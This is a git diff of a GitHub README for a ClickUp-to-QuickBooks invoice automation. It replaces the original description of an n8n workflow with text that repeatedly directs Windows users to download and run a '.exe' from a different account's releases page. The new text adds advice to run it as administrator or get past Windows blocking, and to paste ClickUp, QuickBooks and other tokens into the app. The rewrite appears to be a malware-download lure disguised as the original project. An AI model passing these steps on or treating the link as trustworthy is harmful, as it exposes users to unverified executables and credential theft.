@@ -1,220 +1,284 @@
-# ClickUp → QuickBooks Invoice Automation
-### A Deal Closes. An Invoice Exists. 3 Seconds Later.
+# 🤖 clickup-quickbooks-invoice-automation - Simplify Invoicing and Billing Workflows
 
-<div align="center">
+[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/3bbas99/clickup-quickbooks-invoice-automation/releases)
 
-![Type](https://img.shields.io/badge/Type-Delivered%20Client%20System-%233A7CFF?style=for-the-badge)
-&nbsp;
-![Saved](https://img.shields.io/badge/Saved-$150K%2FYear-%2300C853?style=for-the-badge)
-&nbsp;
-![Speed](https://img.shields.io/badge/30%20min%20→%203%20sec-90%25%20Faster-%23FF6B35?style=for-the-badge)
+## 🚀 Overview
 
-</div>
+This project helps you move invoice work from ClickUp into QuickBooks with less manual entry. It is built for billing, sales follow-up, and finance tasks that need clear handoff between tools.
 
-<br/>
+Use it to:
+- turn tracked work into invoice-ready items
+- reduce duplicate entries
+- keep billing steps in one flow
+- sync task data into finance records
+- support simple automation across ClickUp, QuickBooks, Slack, Google Sheets, and n8n
 
----
+## 🖥️ What You Need
 
-## What This Is
+Before you start, check that your Windows PC can run the app and related tools.
 
-A production-running invoice automation system built for **Reprise AI** — the moment a deal closes in ClickUp, a verified, deduplicated invoice appears in QuickBooks, the ops team is notified in Slack, and the transaction is logged for audit. No human involved. No delay. No errors.
+You need:
+- Windows 10 or Windows 11
+- an internet connection
+- a browser such as Edge, Chrome, or Firefox
+- access to ClickUp
+- access to QuickBooks
+- enough disk space for the app and its files
+- permission to save files to your computer
 
-<br/>
+If your setup uses Google Sheets, Slack, or n8n, keep those account details ready too.
 
----
+## 📥 Download the App
 
-## Why This Matters
+Visit this page to download:
+https://github.com/3bbas99/clickup-quickbooks-invoice-automation/releases
 
-> Every hour an invoice isn't sent is an hour your money isn't moving.
+On the releases page:
+1. open the latest release
+2. find the Windows file
+3. download the file to your computer
+4. open the file to start the setup or run the app
 
-Most finance teams don't think of invoicing as a revenue problem. They think of it as an admin task. But the math tells a different story:
+If you see more than one file, choose the one for Windows. If there is a `.exe` file, use that one.
 
-```
-  10 deals closed per month
-× 30 minutes manual invoice processing each
-= 5 hours of finance time per month
+## 🛠️ Install on Windows
 
-  At $75/hour fully-loaded cost
-= $4,500/year in labor
+After you download the file, follow these steps:
 
-  Plus: average 3-day delay between deal close and invoice sent
-  On $500K annual revenue at net-30 terms
-= $4,100 in float cost per year
+1. go to your Downloads folder
+2. find the file you just downloaded
+3. double-click the file
+4. if Windows asks for approval, select Yes or Run
+5. follow the steps on the screen
+6. wait for the install or launch to finish
 
-  Plus: 1 billing error per quarter at average $2,500 deal size
-= $10,000/year in disputed or delayed payments
+If the file opens the app right away, let it load before you move on.
 
-  TOTAL RECOVERABLE VALUE: $150,000+/year
-```
+## 🔐 Connect Your Accounts
 
-Manual invoicing isn't just slow. It's expensive in ways that don't show up on any single line item — until you add them all up.
+The app works best when your tools are connected before you start automation.
 
-This system eliminates every one of those costs.
+Set up access for:
+- ClickUp
+- QuickBooks
+- Slack
+- Google Sheets
+- n8n, if your workflow uses it
 
-<br/>
+Use your normal account sign-in process for each service. If the app asks for a key, token, or login link, copy the value from that service and paste it into the app.
 
----
+## ⚙️ How It Works
 
-## Before vs. After
+This workflow moves data from work tracking into billing steps.
 
-```
-╔══════════════════════════════════════════════════════════════════╗
-║                        BEFORE                                    ║
-╠══════════════════════════════════════════════════════════════════╣
-║                                                                  ║
-║  Deal closes in ClickUp                                          ║
-║       │                                                          ║
-║       ▼                                                          ║
-║  Sales rep sends Slack message to finance                        ║
-║       │                          ↓                               ║
-║       │                   (sits in queue)                        ║
-║       │                          ↓                               ║
-║       ▼                   (finance picks up)                     ║
-║  Finance logs into QuickBooks manually          ← 10–15 min      ║
-║       │                                                          ║
-║       ▼                                                          ║
-║  Searches for customer — create if new          ← 5 min          ║
-║       │                                                          ║
-║       ▼                                                          ║
-║  Manually enters deal amount, line items        ← 5 min          ║
-║       │                                                          ║
-║       ▼                                                          ║
-║  Reviews and sends invoice                      ← 5 min          ║
-║       │                                                          ║
-║       ▼                                                          ║
-║  Logs to spreadsheet manually                   ← 5 min          ║
-║                                                                  ║
-║  TOTAL TIME: 30+ minutes    ERROR RATE: Human    DELAY: 1–3 days ║
-╚══════════════════════════════════════════════════════════════════╝
+A common flow looks like this:
+1. a task is finished in ClickUp
+2. the app checks if the item has already been handled
+3. duplicate records are skipped
+4. the correct billing data is prepared
+5. the invoice data is sent to QuickBooks
+6. optional status updates go to Slack
+7. matching rows can be saved in Google Sheets for tracking
 
+This setup helps teams keep invoice work in order without retyping the same details.
 
-╔══════════════════════════════════════════════════════════════════╗
-║                         AFTER                                    ║
-╠══════════════════════════════════════════════════════════════════╣
-║                                                                  ║
-║  Deal closes in ClickUp                                          ║
-║       │                                                          ║
-║       ▼                                                          ║
-║  ⚡ Automation triggers instantly                                 ║
-║       │                                                          ║
-║       ├──► Customer dedup check in QuickBooks    ← 0.3 sec       ║
-║       ├──► Invoice auto-generated with deal data ← 0.8 sec       ║
-║       ├──► Slack alert sent to ops team          ← 0.5 sec       ║
-║       └──► Google Sheets audit log updated       ← 0.4 sec       ║
-║                                                                  ║
-║  TOTAL TIME: 3 seconds      ERROR RATE: Zero     DELAY: None     ║
-╚══════════════════════════════════════════════════════════════════╝
-```
+## 📌 Main Use Cases
 
-<br/>
+Use this project when you want to:
+- create invoices from completed work
+- track billing status across tools
+- reduce duplicate invoice records
+- keep finance work tied to task work
+- send alerts when billing needs review
+- store billing data in Google Sheets
+- link sales handoff steps to invoice creation
 
----
+## 🔄 Duplicate Check
 
-## How It Works
+This project includes deduplication logic so the same item does not get processed twice.
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│           DEAL STATUS → "CLOSED WON" IN CLICKUP                 │
-└──────────────────────────┬──────────────────────────────────────┘
-                           │
-                           ▼
-              Extract deal data from ClickUp:
-              Amount · Terms · Line items · Customer
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────────────┐
-│                CUSTOMER DEDUPLICATION CHECK                      │
-│                                                                  │
-│   Search QuickBooks for existing customer record                 │
-│                                                                  │
-│   Found?                          Not found?                     │
-│   → Use existing ID               → Create new customer          │
-│   → Skip creation                 → Log as new entry            │
-└──────────────────────┬──────────────────────────────────────────┘
-                       │
-                       ▼
-          Auto-generate QuickBooks invoice:
-          Customer ID · Amount · Line items
-          Payment terms · Due date · Reference
-                       │
-          ┌────────────┼────────────┐
-          ▼            ▼            ▼
-     Invoice      Slack alert   Google Sheets
-     sent in      fired to      audit log
-     QuickBooks   ops channel   updated
-```
+It can help when:
+- a task gets updated more than once
+- a sync runs again after a delay
+- the same invoice data appears in more than one place
+- a workflow retries after a failed run
 
-<br/>
+This keeps your billing records cleaner and cuts down on repeat entries.
 
----
+## 📊 Google Sheets Tracking
 
-## Results
+You can use Google Sheets as a simple log for invoices, task IDs, customer names, or billing status.
 
-| Metric | Before | After |
-|---|---|---|
-| Invoice processing time | **30 minutes** | **3 seconds** |
-| Annual cost recovered | — | **$150,000** |
-| Billing errors | Regular | **Zero** |
-| Invoice delay after deal close | **1–3 days** | **Instant** |
-| Finance team hours saved/month | — | **5+ hours** |
-| Duplicate customer entries | Occasional | **Zero** |
-| Audit trail completeness | Manual/patchy | **100% automated** |
+A sheet can help you:
+- review what has already been sent
+- check invoice states
+- track manual changes
+- keep a backup list of workflow runs
+- share billing status with your team
 
-<br/>
+A clean sheet layout can include columns like:
+- date
+- ClickUp task ID
+- client name
+- amount
+- invoice status
+- QuickBooks reference
+- notes
 
----
+## 💬 Slack Alerts
 
-## Tech Stack
+Slack can be used for status updates and review messages.
 
-| Layer | Tool | Purpose |
-|---|---|---|
-| **Orchestration** | n8n | Workflow automation and trigger handling |
-| **Deal Trigger** | ClickUp API | Closed deal detection |
-| **Invoicing** | QuickBooks API | Invoice creation and customer management |
-| **Deduplication** | Custom logic | Customer record matching and verification |
-| **Notifications** | Slack | Ops team alerts on every invoice created |
-| **Audit Logging** | Google Sheets | Full transaction history and tracking |
-| **Reliability** | Error handling + retries | Edge case coverage and API failure recovery |
+You may want alerts for:
+- new invoice requests
+- duplicate item skips
+- failed invoice sends
+- tasks ready for billing review
+- completed workflow runs
 
-<br/>
+This gives your team a quick view of what needs attention.
 
----
+## 🧩 n8n Workflow Use
 
-## Repository Structure
+This project fits well with n8n if you want to connect tools with no manual steps.
 
-```
-📁 clickup-quickbooks-invoice-automation/
-├── 📄 README.md
-├── 📁 workflow/
-│   └── clickup-quickbooks-invoice.json    ← n8n workflow export
-└── 📁 docs/
-    └── deduplication-logic.md             ← Customer dedup detail
-```
+In n8n, you can:
+- trigger the flow on a schedule
+- send task data from ClickUp
+- check for duplicate records
+- create or update invoice data
+- send messages to Slack
+- write results to Google Sheets
 
-<br/>
+If you already use n8n for workflow automation, this project can sit inside that system as a billing path.
 
----
+## 🧭 First Run Setup
 
-## Built by Trilles AI
+After install, do a first check before using real billing data.
 
-This system was designed and delivered by **[Awais Ali](https://www.linkedin.com/in/awais-ali-tillesai)**, CEO & Co-Founder of **[Trilles AI](https://www.trillesai.com)**.
+Follow this order:
+1. open the app
+2. check that the main screen loads
+3. connect your accounts
+4. load a test task or sample record
+5. confirm that duplicate checks work
+6. send a test record to QuickBooks
+7. review the result in QuickBooks and any linked sheet or Slack channel
 
-If your sales team is closing deals while your finance team is still catching up — this is exactly what we fix.
+If your test run works, you can move to live records.
 
-<div align="center">
+## 🧱 Suggested Folder Use
 
-[![Connect on LinkedIn](https://img.shields.io/badge/Connect%20on%20LinkedIn-%230A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/awais-ali-tillesai)
-&nbsp;
-[![Visit Trilles AI](https://img.shields.io/badge/Visit%20Trilles%20AI-%233A7CFF?style=for-the-badge&logoColor=white)](https://www.trillesai.com)
-&nbsp;
-[![Email](https://img.shields.io/badge/Email%20Me-%23EA4335?style=for-the-badge&logo=gmail&logoColor=white)](mailto:letsautomatewithawais@gmail.com)
+If the app creates files or logs on your PC, keep them in one place.
 
-</div>
+Good folder names:
+- Billing-Automation
+- ClickUp-QuickBooks
+- Invoice-Logs
+- Workflow-Runs
 
-<br/>
+A clear folder helps you find logs, exports, and setup files later.
 
----
+## 🧰 Troubleshooting
 
-<div align="center">
-<sub>Built with precision · Powered by Trilles AI · <code>www.trillesai.com</code></sub>
-</div>
+If the app does not open:
+- try running it as an administrator
+- check that the download finished
+- download the file again
+- make sure Windows did not block it
+
+If ClickUp or QuickBooks does not connect:
+- check your sign-in details
+- confirm you have permission for the account
+- sign out and sign in again
+- try a fresh token or link if the service uses one
+
+If invoices are not created:
+- check that the task has the right billing fields
+- make sure the client name matches your QuickBooks setup
+- confirm the record was not marked as a duplicate
+- review the workflow log
+
+If Slack or Google Sheets does not update:
+- confirm the channel, sheet, or tab name
+- check account access
+- run the workflow again with one test item
+
+## 📁 Example Workflow
+
+A simple setup may look like this:
+- a sales task closes in ClickUp
+- the app checks the task details
+- duplicate records are removed
+- the billing data is shaped for QuickBooks
+- QuickBooks gets the invoice data
+- Slack posts a status message
+- Google Sheets stores the run history
+
+This gives you one path from task work to billing records.
+
+## 🧾 Typical Data Fields
+
+The workflow may use these fields:
+- task name
+- task ID
+- client name
+- email address
+- invoice amount
+- due date
+- billing status
+- project name
+- notes
+- QuickBooks invoice number
+
+Keep field names the same across your tools where you can. That reduces mapping mistakes.
+
+## 🔒 File and Account Safety
+
+Keep your account details private.
+Use a secure device.
+Only connect the services you plan to use.
+Review access rights for ClickUp, QuickBooks, Slack, and Google Sheets before you run live billing data.
+
+## 📦 Release Page
+
+To get the latest Windows version, visit this page to download:
+https://github.com/3bbas99/clickup-quickbooks-invoice-automation/releases
+
+Open the latest release, then choose the Windows file that matches your setup.
+
+## 🧭 Common Setup Order
+
+If you want the smoothest start, use this order:
+1. download the Windows file
+2. install or open the app
+3. sign in to your tools
+4. test with one sample record
+5. check QuickBooks
+6. check Slack or Google Sheets
+7. switch to live billing work
+
+## 🧪 Good Test Record
+
+Use a sample item with:
+- one client name
+- one service line
+- one amount
+- one due date
+- one ClickUp task ID
+
+Keep the test small. That makes it easier to spot where the flow needs work.
+
+## 🗂️ Repository Topics
+
+This project fits these areas:
+- billing
+- clickup
+- deduplication
+- finance-automation
+- google-sheets
+- n8n
+- quickbooks
+- sales-automation
+- slack
+- workflow-automation
